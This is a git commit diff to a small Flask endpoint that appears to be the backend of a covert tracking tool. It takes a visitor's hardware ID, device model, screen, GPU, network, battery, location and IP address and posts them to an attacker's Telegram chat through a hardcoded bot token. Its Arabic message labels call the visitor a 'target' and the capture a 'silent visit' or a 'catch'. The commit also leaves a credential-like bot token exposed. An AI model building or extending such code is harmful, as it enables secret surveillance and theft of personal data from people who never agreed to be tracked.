bc709732cb4150dd47e315e1e69f70140c6cdef9
Yassrt <98502045+Yassrt@users.noreply.github.com>
2026-04-09 13:10:14 +0300

    Update index.py

--- api/index.py
+++ api/index.py
@@ -3,7 +3,6 @@ import requests
 
 app = Flask(__name__)
 
-# بياناتك الخاصة
 TOKEN = "8619490492:AAEfXC0wN0Uh73BA9TniEqyQh_gb_GyfzUg"
 CHAT_ID = "5811700860"
 
@@ -16,10 +15,10 @@ def handler():
         lon = data.get('lon')
         user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
 
-        msg = f"🛡 **تم سحب هوية رقمية جديدة**\n\n"
+        msg = f"🛡 **صيد تقني دقيق**\n\n"
         msg += f"🆔 **HW-ID:** `{info.get('hw_id')}`\n"
-        msg += f"👤 **الهدف:** `{data.get('target_id', 'N/A')}`\n"
-        msg += f"🛠 **الخدمة:** `{data.get('service', 'زيارة صامتة')}`\n"
+        msg += f"📱 **الجهاز:** `{info.get('model')}`\n"
+        msg += f"📏 **الشاشة:** `{info.get('screen')}`\n"
         msg += f"🎮 **GPU:** `{info.get('gpu')}`\n"
         msg += f"📶 **الشبكة:** `{info.get('network')}`\n"
         msg += f"🔋 **البطارية:** `{info.get('battery')}`\n"
@@ -30,7 +29,6 @@ def handler():
         
         requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                       json={"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"})
-        
         return jsonify({"status": "ok"}), 200
     except:
         return jsonify({"status": "error"}), 500
